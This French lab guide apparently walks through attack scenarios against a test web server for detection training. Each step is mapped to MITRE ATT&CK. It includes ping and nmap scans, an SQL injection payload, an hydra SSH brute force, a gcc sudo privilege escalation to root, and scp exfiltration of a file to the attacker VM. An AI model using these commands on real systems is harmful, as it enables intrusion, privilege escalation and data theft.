
# Scénarios d'attaque

## Attaque 1 - Ping et Scan de ports

L’attaquant étant déjà sur le réseau, il a déjà sondé ce dernier afin de découvrir quels sont les appareils présents. Son attention se porte sur un serveur web dont il scanne les ports. Le balayage de ports permet de récupérer beaucoup d’informations sur la cible, notamment ses ports ouverts.

### Attaque 1.1
Tout d'abord, pour vérifier si le serveur qu'il veut attaquer est actif, il va pouvoir effectuer un ping comme suit :

`ping 10.0.0.1`

Pour le MITRE, cela correspond dans la phase Reconnaissance à Active Scanning (https://attack.mitre.org/techniques/T1595), un ping sert à découvrir les hôtes vivants, c’est un scan actif qui peut laisser des traces sur le réseau et dans les logs.

Une alerte est attendue.


## Attaque 1.2

L’outil utilisé ici est **nmap**, un scanner de ports qui permet d’avoir une meilleure idée de la surface d’attaque disponible sur le serveur web.

L’attaque se réalise comme ceci à partir de la VM de l’attaquant : 

`nmap 10.0.0.1`

2 ports devraient être ouverts sur le serveur web : **SSH** (port 22) et **HTTP** (port 80)


Pour le MITRE, cela correspond dans la phase Reconnaissance au Active Scanning (https://attack.mitre.org/techniques/T1595), on scanne activement une machine et cela peut laisser des traces, c’est plus visible qu’une sonde, mais récolte beaucoup plus d’informations. 

Une alerte est attendue.


## Attaque 2 - Récupération des noms utilisateurs par injection SQL

Le service SSH étant inutilisable pour l’instant, l’attaquant se concentre sur l’application web publique hébergée sur le serveur. Il s’agit d’un outil interne permettant aux employés de trouver le contact des autres en donnant leur nom. Coup de chance, l’application est vulnérable : elle est susceptible d’accepter des requêtes non vérifiées vers la base de données. En exploitant une vulnérabilité d’injection SQL, il interroge donc la base MariaDB pour lister tous les employés et récupérer au moins un nom d’utilisateur utilisable pour les étapes ultérieures. 

L’objectif est d’obtenir des informations d’identification partielles sans nécessité d’accès shell initial.
Pour le MITRE, cela correspond dans la phase Initial Access à Exploitation of Public-Facing Application et SQL Injection (https://attack.mitre.org/techniques/T1190). L’injection SQL est une technique d’accès applicatif qui laisse des traces dans les logs HTTP et dans les logs de la base, et qui peut générer des motifs détectables par un IDS si les payloads sont visibles.

L’outil utilisé sera le navigateur web Firefox (installé par défaut avec Debian).

L’attaque se réalise comme ceci à partir de la VM de l’attaquant : 

Naviguez vers http://10.0.0.1/index.php

Effectuez l’injection SQL suivante dans le formulaire web : 

`' or 1=1#`

Cela devrait retourner la liste complète des employés de l’entreprise en prenant avantage du code php vulnérable du serveur. Parmi ceux-ci, l’attaquant remarque **bob**, développeur web. Il a probablement travaillé sur ce serveur, et il vaut donc le coup de s’intéresser à son accès.

Une alerte est attendue.

## Attaque 3 - Brute-force sur un utilisateur

Après identification d’un nom d’utilisateur valide (‘bob’), qui signifie qu’il existe très probablement un utilisateur bob dans le serveur web, l’attaquant lance une attaque par dictionnaire contre le service SSH de la machine vulnérable afin d’obtenir une session authentifiée avec accès au shell. 

L’objectif est d’obtenir un accès au système, en testant de manière automatique une liste de mots de passe issue d’un dictionnaire sur un nom d'utilisateur connu.
Pour le MITRE, cela correspond dans la phase Credential Access au Brute Force (https://attack.mitre.org/techniques/T1110). Les tentatives répétées génèrent des échecs d’authentification visibles dans les logs d’authentification système et peuvent déclencher des règles de détection basées sur des taux d’échec élevés.  

L’outil utilisé ici sera **hydra**, un outil permettant de lancer diverses attaques de force brute au travers de différents protocoles (ftp, ssh, etc) à l’aide de liste d’identifiants et mots de passe fournis.

L’attaque se réalise comme ceci à partir de la VM de l’attaquant (en supposant toujours être dans le dossier /root): 

`hydra -l bob -P wordlist.txt ssh://10.0.0.1`

wordlist.txt contient une petite liste de mots de passe faibles.

Cette ligne devrait apparaître : 

`[22][ssh] host: 10.10.212.228   login: bob   password: password`

Il semblerait donc que bob utilise un mot de passe beaucoup trop faible (‘password’), permettant ainsi à l’attaquant de se connecter en tant que bob sur le serveur web avec cette commande, puis en rentrant le mot de passe trouvé : 

`ssh bob@10.0.0.1`

Une alerte est attendue.

## Attaque 4 - Escalade de privilège sur le serveur 

Une fois connecté en tant que bob, l’attaquant se rend compte qu’il ne possède pas les permissions nécessaires pour pouvoir accéder à l’ensemble des fichiers du serveur. En revanche, de par son statut de développeur, bob possède certains privilèges. L’attaquant exécute `sudo -l` et voit que bob peut utiliser le compilateur **gcc** en tant que root. 

L’objectif est d’obtenir un accès privilégié au système, en utilisant des techniques dites d’escalation de privilège.
Pour le MITRE, cela correspond dans la phase Privilege Escalation au Abuse Elevation Control Mechanism (https://attack.mitre.org/techniques/T1548). Cela lui permet d’obtenir des permissions supérieures.

L’outil utilisé ici sera **gcc**, un outil de compilation pouvant servir de vecteur d’attaque s’il est exécuté avec des privilèges.

L’attaque se réalise comme ceci à partir de la VM de l’attaquant (en tant que bob sur le serveur web): 

`sudo gcc -wrapper /bin/sh,-s .`

Cette commande permet de garder les privilèges obtenus en utilisant gcc pour exécuter un shell.

En faisant whoami, cela devrait renvoyer root. L’attaquant a donc un accès total au serveur web.

Une alerte est attendue.

## Attaque 5 - Exfiltration de données

Après prise de contrôle de privilèges, l’attaquant réalise l’exfiltration d’un fichier ciblé depuis la machine compromise vers une machine contrôlée par l’attaquant. Le transfert est réalisé via un canal chiffré standard (scp/SSH) afin de réduire la visibilité du contenu, en s’appuyant sur une connexion sortante autorisée ou nouvellement établie. 

L’objectif est de voler des données d’intérêt pour l’attaquant, en l'occurrence next_prime_minister_of_canada.jpg situé dans le dossier /root. Cette image est critique pour la sécurité du premier ministre.
Pour le MITRE, cela correspond dans la phase Exfiltration à Exfiltration Over Alternative Protocols(https://attack.mitre.org/techniques/T1048). L’exfiltration chiffrée masque le contenu mais laisse des métadonnées réseau (endpoints, volumes, durée) exploitables pour la détection.

L’outil utilisé ici sera **scp**, un outil permettant de copier des fichiers de manière sécurisée sur le réseau à l’aide du protocole SFTP sur une connexion SSH.

L’attaque se réalise comme ceci :

`scp /root/next_prime_minister_of_canada.jpg debian@10.0.0.3:/home/debian` 

Puis se connecter en donnant le mot de passe de la VM attaquant.

Si tout s’est bien passé, l’image devrait être accessible sur la VM attaquant, et nous vous laissons découvrir ce fichier primordial pour la sécurité du Canada.

Une alerte est attendue.

